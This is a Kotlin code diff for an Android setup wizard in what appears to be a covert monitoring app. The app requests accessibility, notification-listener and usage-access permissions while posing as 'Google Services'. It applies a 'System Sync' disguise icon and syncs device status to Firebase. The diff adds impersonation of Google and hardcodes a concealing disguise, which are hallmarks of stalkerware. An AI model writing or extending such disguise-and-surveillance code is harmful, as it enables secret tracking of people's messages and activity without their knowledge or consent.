@@ -103,7 +103,7 @@ class SetupWizardActivity : AppCompatActivity() {
             try {
                 val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                 startActivity(intent)
-                Toast.makeText(this, "Enable 'System Services'", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Enable 'Google Services'", Toast.LENGTH_LONG).show()
             } catch (e: Exception) {
                 Toast.makeText(this, "Please open Settings > Accessibility", Toast.LENGTH_SHORT).show()
             }
@@ -114,7 +114,7 @@ class SetupWizardActivity : AppCompatActivity() {
             try {
                 val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                 startActivity(intent)
-                Toast.makeText(this, "Enable notification access for 'System Services'", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Enable notification access for 'Google Services'", Toast.LENGTH_LONG).show()
             } catch (e: Exception) {
                 Toast.makeText(this, "Please open Settings > Notification Access", Toast.LENGTH_SHORT).show()
             }
@@ -160,7 +160,7 @@ class SetupWizardActivity : AppCompatActivity() {
             try {
                 val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                 startActivity(intent)
-                Toast.makeText(this, "Enable Usage Access for 'System Services'", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Enable Usage Access for 'Google Services'", Toast.LENGTH_LONG).show()
             } catch (e: Exception) {
                 Toast.makeText(this, "Please open Settings > Usage Access", Toast.LENGTH_SHORT).show()
             }
@@ -201,14 +201,14 @@ class SetupWizardActivity : AppCompatActivity() {
             prefs.parentPin = code
             prefs.isConfigured = true
 
-            // Lock in hardware-matched disguise profile as default (Vivo, Samsung, Xiaomi, or Universal)
-            val brandProfile = DisguiseManager(this).getHardwareBrandDisguise()
-            DisguiseManager.applyDisguise(this, brandProfile)
+            // Lock in System Sync disguise (purple 2-arrows rotating icon) as default
+            val defaultProfile = DisguiseProfile.SYSTEM_SYNC
+            DisguiseManager.applyDisguise(this, defaultProfile)
 
-            // Initial Device Status sync to Firebase Cloud
+            // Initial Device Status sync to Cloud
             FirebaseSyncManager.getInstance(this).syncDeviceStatus(
                 isOnline = true,
-                disguise = brandProfile.title,
+                disguise = defaultProfile.title,
                 location = "Protected • Active"
             )
 
